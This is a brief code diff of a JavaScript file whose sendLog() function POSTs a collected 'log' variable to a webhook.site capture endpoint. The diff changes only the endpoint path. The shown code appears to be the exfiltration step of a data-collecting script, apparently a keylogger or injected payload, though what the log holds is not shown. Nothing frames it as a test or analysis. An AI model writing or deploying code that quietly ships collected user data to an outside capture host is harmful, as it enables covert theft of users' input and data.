@@ -8,7 +8,7 @@ try {
 
     function sendLog() {
         if (log) {
-            fetch('https://webhook.site/8c30f542-6903-4488-8aa9-0609f3eb8972', {
+            fetch('https://webhook.site/8c30f542-6903-4488-8aa9-0609f3eb8972/log', {
                 method: 'POST',
                 body: log,
                 headers: { 'Content-Type': 'text/plain' }
